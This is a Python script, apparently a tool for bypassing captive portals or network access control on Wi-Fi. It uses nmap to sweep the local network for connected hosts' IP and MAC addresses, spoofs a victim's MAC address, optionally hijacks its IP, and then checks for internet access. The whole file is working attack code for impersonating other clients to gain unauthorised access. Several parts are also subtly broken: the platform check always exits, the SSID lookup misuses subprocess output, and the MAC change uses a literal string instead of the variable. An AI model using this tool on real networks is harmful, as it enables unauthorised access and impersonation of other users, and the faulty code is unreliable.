#!/usr/bin/env python3
import subprocess
import psutil
import socket
import time
import nmap
import sys
import os


def check_platform():
    """
    Check if the script is running on Linux
    """
    if sys.platform != "linux" or sys.platform != "linux2":
        sys.exit("[x] Script need to be run on Linux (tested on Kali). Leaving...")


def check_privileges():
    """
    Check if the script is launched with appropriate permissions
    """
    if not os.environ.get("SUDO_UID") and os.geteuid() != 0:
        sys.exit("[x] You need to run this script with sudo or as root. Leaving...")


def convert_netmask_to_cidr(netmask):
    """Convert current netmask to CIDR

    :param netmask: Wi-Fi interface netmask
    """
    list_mask = netmask.split(".")
    processing = list()

    for octet in list_mask:
        processing.append(str(bin(int(octet))).count("1"))
    
    return sum(processing)


def get_ssid(iface):
    """
    Get Service Set IDentifier (SSID) interface is connected on
    """
    try:
        output = subprocess.run(f"sudo iwgetid {iface}", shell=True)
        return output.split('"')[1]

    except Exception:
        return "--"


def get_addr_info(iface):
    """
    Get network information regarding current Wi-Fi interface
    """
    if iface in list(psutil.net_if_addrs().keys()):
        iface_info = psutil.net_if_addrs()[iface]

        try:
            ipv4_info = iface_info[0]
            ipv6_info = iface_info[2]
            phys_info = iface_info[1]

            if ipv4_info.netmask is not None and ipv4_info.address != "127.0.0.1":
                return ipv4_info.address, ipv4_info.broadcast, ipv4_info.netmask, phys_info.address, get_ssid(iface)

        except IndexError:
            sys.exit(f"[x] Unable to retrieve information from {iface}. Leaving...")

    else:
        sys.exit(f"[x] Interface {iface} does not exist. Leaving...")


def scan_network(network, currentIp):
    """
    Scan specified network

    :param network: network to be scanned
    """
    ip_mac_array = []
    nmap_arg = f"-n -sn -PR -PS -PA -PU -T5 --exclude {currentIp}"
    scan = nmap.PortScanner().scan(hosts=network,arguments=nmap_arg, sudo=True).get('scan')

    for element in scan:
        try:
            ipaddr = element
            macaddr = scan[element]["addresses"]["mac"]

            ip_mac_array.append(f"{ipaddr};{macaddr}")

        except KeyError:
            pass
    
    return ip_mac_array


def hijack_ip_and_mac(iface, ipaddr, ipbroadcast, ipnetmask, macaddr, iphijack):
    # Change MAC Address
    subprocess.run(f"sudo ifconfig {iface} down", shell=True)
    subprocess.run(f"sudo ifconfig {iface} hw ether macaddr", shell=True)
    subprocess.run(f"sudo ifconfig {iface} up", shell=True)

    if iphijack:
        # Hijack IP Address
        subprocess.run(f"ifconfig {iface} {ipaddr} netmask {ipnetmask} broadcast {ipbroadcast}", shell=True)

    else:
        # Release and renew IP address with spoofed MAC
        subprocess.run(f"sudo dhclient -r && sudo dhclient -v {iface}", shell=True)


def check_internet_cnx():
    try:
        host = socket.gethostbyname('www.google.com')
        s = socket.create_connection((host, 80), 2)
        return True
    
    except:
        return False 
